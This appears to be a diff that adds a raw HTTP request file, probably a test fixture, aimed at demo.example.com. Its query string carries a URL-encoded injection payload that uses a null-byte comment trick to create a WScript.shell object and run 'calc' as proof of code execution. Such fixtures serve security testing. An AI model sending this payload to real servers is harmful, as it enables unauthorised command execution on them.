@@ -1,0 +1,4 @@
+GET /a?q=/*%00*/o%3DCreateObject("WScript.shell").run("calc") HTTP/1.1
+Host: demo.example.com
+Connection: close
+
